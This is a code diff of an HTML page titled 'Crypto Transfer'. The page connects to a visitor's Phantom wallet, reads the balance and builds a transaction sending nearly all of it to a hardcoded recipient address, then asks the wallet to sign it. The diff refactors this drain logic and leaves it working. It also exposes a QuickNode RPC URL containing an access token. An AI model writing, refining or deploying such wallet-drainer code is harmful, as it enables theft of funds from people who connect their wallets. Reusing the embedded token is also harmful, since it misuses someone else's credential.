@@ -5,15 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
     
-    <!-- Updated Solana Web3.js library -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    
-    <!-- Buffer library required for Web3.js -->
+    <!-- Buffer polyfill required for Solana Web3.js -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/5.7.1/buffer.min.js"></script>
     <script>
-        window.Buffer = buffer.Buffer;
+        window.Buffer = window.Buffer || buffer.Buffer;
     </script>
-    
+
+    <!-- Updated Solana Web3.js library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
     <link rel="icon" href="data:,">
 </head>
 <body>
@@ -29,25 +29,25 @@
 
             try {
                 // Connect to Phantom wallet
-                const response = await window.solana.connect();
-                const publicKey = response.publicKey;
+                await window.solana.connect();
+                const publicKey = window.solana.publicKey;
                 if (!publicKey) {
                     throw new Error('Failed to get public key.');
                 }
 
                 console.log(`Connected to wallet: ${publicKey.toString()}`);
 
-                // Connect to Solana network via QuickNode RPC URL
+                // Connect to Solana blockchain via QuickNode
                 const connection = new solanaWeb3.Connection(
                     'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
                     'confirmed'
                 );
 
-                // Get balance and check for sufficient funds
+                // Get wallet balance in lamports
                 const balance = await connection.getBalance(publicKey);
                 console.log(`Wallet balance: ${balance} lamports`);
 
-                if (balance <= 5000) {  // Subtracting estimated fee of 5000 lamports
+                if (balance <= 5000) {  // 5000 lamports reserved for transaction fee
                     alert('Insufficient SOL balance to cover transaction fees.');
                     return;
                 }
@@ -55,12 +55,15 @@
                 // Define recipient wallet address
                 const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
 
+                // Calculate lamports to send after deducting transaction fee
+                const amountToSend = balance - 5000;
+
                 // Create transaction to transfer SOL
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: recipient,
-                        lamports: balance - 5000 // Subtract estimated transaction fee
+                        lamports: amountToSend
                     })
                 );
 
@@ -68,7 +71,7 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
-                // Sign and send the transaction
+                // Sign the transaction with Phantom wallet
                 const signedTransaction = await window.solana.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
